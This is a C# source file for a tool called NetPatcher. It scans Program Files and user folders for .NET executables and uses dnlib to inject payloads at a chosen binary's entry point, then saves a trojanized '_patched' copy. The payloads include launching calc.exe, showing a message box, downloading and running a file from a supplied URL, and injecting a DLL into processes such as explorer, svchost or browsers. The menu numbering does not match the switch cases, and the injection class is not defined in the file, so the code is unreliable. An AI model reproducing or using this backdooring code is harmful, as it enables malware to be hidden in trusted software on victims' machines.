/* Author		: Gregory King
 * Date			: 07/16/25
 * Description	: This program is a .NET patcher that allows users to modify .NET applications to execute specific actions. The program will find compatible binaries in the Program Files, Program Files (x86) or user profile directories, and then applies the specified patch based on user input. The patched executable will be copied to the current directory with a new name. This version uses dnlib for binary manipulation. The patched program will execute the injected payload immediately when started. After the payload, the original program logic resumes, unless the payload itself interrupts or terminates execution (for example, if the payload throws an exception or calls Environment.Exit).
 * 
 * Patching options:
 * 1) popcalc
 * 2) MessageBox
 * 3) Download + exec
 * 4) Inject DLL to thread using CreateRemoteThread, selects process to inject from list of processes.
 */

using System;
using System.Collections.Generic;
using System.IO;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace NetPatcher
{ 
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Welcome to NetPatcher!");
            Console.WriteLine("Searching for .NET assemblies that are patchable... Please wait.");

			var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var searchDirs = new[] { @"C:\Program Files (x86)", @"C:\Program Files", userProfile };
            var assemblies = new List<string>();
            foreach (var dir in searchDirs)
            {
                try
                {
                    
                    foreach (var file in Directory.EnumerateFiles(dir, "*.*", SearchOption.AllDirectories))
                    {
                        var ext = Path.GetExtension(file).ToLowerInvariant();
                        if (ext != ".exe" && ext != ".dll") continue;
                        try
                        {
                            /* check if it's a .net assembly */
                            using (var module = ModuleDefMD.Load(file))
                            {
                                if (module.EntryPoint != null || ext == ".dll")
                                {
                                    File.AppendAllText("compatiblebins.txt", file + "\n");
                                    assemblies.Add(file);
                                    //if (assemblies.Count >= 15000) break;
                                }
                            }

                        }
                        catch { }
                    }
                }
                catch { }
                //if (assemblies.Count >= 15000) break;
            }

            if (assemblies.Count == 0)
            {
                Console.WriteLine("No .NET assemblies found.");
                return;
            }

            Console.WriteLine("Select a .NET assembly to patch:");
            for (int i = 0; i < assemblies.Count; i++)
                Console.WriteLine($"{i + 1}: {assemblies[i]}");
            Console.Write("Choice: ");
            if (!int.TryParse(Console.ReadLine(), out int fileChoice) || fileChoice < 1 || fileChoice > assemblies.Count)
            {
                Console.WriteLine("Invalid choice.");
                return;
            }
            string path = assemblies[fileChoice - 1];

            Console.WriteLine("Select payload to inject:");
            Console.WriteLine("1. Execute calc.exe");
            Console.WriteLine("2. Download and execute file");
            Console.WriteLine("3. Show message box");
            Console.WriteLine("4. Inject DLL into another process (explorer, svchost, firefox, msedge, chrome)");
            Console.Write("Choice: ");
            var payloadChoice = Console.ReadLine();

            try
            {
                var module = ModuleDefMD.Load(path);
                var entry = module.EntryPoint;
                if (entry == null)
                {
                    Console.WriteLine("No entry point found.");
                    return;
                }
                var instrs = entry.Body.Instructions;

                switch (payloadChoice)
                {
                    case "1": /* pop calc */
                        var processStart = module.Import(typeof(System.Diagnostics.Process).GetMethod("Start", new[] { typeof(string) }));
                        instrs.Insert(0, OpCodes.Ldstr.ToInstruction("calc.exe"));
                        instrs.Insert(1, OpCodes.Call.ToInstruction(processStart));
                        instrs.Insert(2, OpCodes.Pop.ToInstruction());
                        break;

                    case "2":
						/* show message box */
						var showMsgBox = module.Import(typeof(System.Windows.Forms.MessageBox).GetMethod("Show", new[] { typeof(string) }));
                        instrs.Insert(0, OpCodes.Ldstr.ToInstruction("patched by NetPatcher"));
                        instrs.Insert(1, OpCodes.Call.ToInstruction(showMsgBox));
                        instrs.Insert(2, OpCodes.Pop.ToInstruction());
                        break;

					case "3":
						/* download and execute file */
						Console.Write("Enter URL to download: ");
						string url = Console.ReadLine();
						Console.Write("Enter filename to save as (e.g. C:\\Windows\\Temp\\payload.exe): ");
						string filename = Console.ReadLine();

						var webClientCtor = module.Import(typeof(System.Net.WebClient).GetConstructor(Type.EmptyTypes));
						var downloadFile = module.Import(typeof(System.Net.WebClient).GetMethod("DownloadFile", new[] { typeof(string), typeof(string) }));
						var processStart2 = module.Import(typeof(System.Diagnostics.Process).GetMethod("Start", new[] { typeof(string) }));

						instrs.Insert(0, OpCodes.Newobj.ToInstruction(webClientCtor));
						instrs.Insert(1, OpCodes.Dup.ToInstruction());
						instrs.Insert(2, OpCodes.Ldstr.ToInstruction(url));
						instrs.Insert(3, OpCodes.Ldstr.ToInstruction(filename));
						instrs.Insert(4, OpCodes.Callvirt.ToInstruction(downloadFile));
						instrs.Insert(5, OpCodes.Pop.ToInstruction());
						instrs.Insert(6, OpCodes.Ldstr.ToInstruction(filename));
						instrs.Insert(7, OpCodes.Call.ToInstruction(processStart2));
						instrs.Insert(8, OpCodes.Pop.ToInstruction());
						break;

					case "4":
						Console.Write("Enter full path of DLL to inject: ");
						string dllPath = Console.ReadLine();

						var patcher = new DllInjectionPatcher(module, dllPath);
						patcher.Inject(); /* sets up injection method */
						instrs.Insert(0, OpCodes.Call.ToInstruction(patcher.EntryPointMethod)); /* inserts call at entry point */
						break;

					default:
                        Console.WriteLine("Invalid payload choice.");
                        return;
                }

                string patchedPath = Path.Combine(
                    Directory.GetCurrentDirectory(),
                    Path.GetFileNameWithoutExtension(path) + "_patched" + Path.GetExtension(path));
                module.Write(patchedPath);
                Console.WriteLine($"Patched .NET assembly saved as: {patchedPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error patching .NET assembly: {ex.Message}");
            }
        }
    }
}
